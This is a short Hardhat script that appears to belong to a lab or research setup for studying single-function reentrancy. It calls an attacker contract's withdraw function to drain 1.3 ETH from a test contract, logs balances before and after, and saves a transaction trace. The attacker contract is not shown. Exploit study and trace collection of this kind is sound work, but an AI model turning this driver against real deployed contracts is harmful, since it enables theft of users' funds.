  const {ethers} = require("hardhat");
  const {saveTrace} = require("../../utils/saveTrace.js");
  const {loadContext} = require ("../Single_function_reentrancy/context.js");
  async function main () {
    const ctx = await loadContext();
      console.log("attacker Contract balance before executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.attackerAddress)), "ETH");;
      console.log("reentrancyTest Contract balance before executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.reentrancyTestAddress)), "ETH");;
      console.log("attacker account balance before executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.signer)), "ETH");

    const amount = ethers.parseEther("1.3");
    const calldata = ctx.contractAttacker.interface.encodeFunctionData("call_withdraw", [ethers.parseEther("1.3")]);
    const tx = await ctx.signer.sendTransaction({
          to : ctx.attackerAddress,
          data: calldata,
    
        // value: ethers.parseEther("1")    
      })
      receipt = await tx.wait();
    console.log(tx.hash);


      console.log("attacker Contract balance after executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.attackerAddress)), "ETH");;
      console.log("reentrancyTest Contract balance after executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.reentrancyTestAddress)), "ETH");;
      console.log("attacker account balance after executing attack = ", await ethers.formatEther(await ethers.provider.getBalance(ctx.signer)), "ETH");

  await saveTrace(tx.hash, "./traces/hardhat_traces/attacker", "attack");
  
  }
  main().catch(console.error);
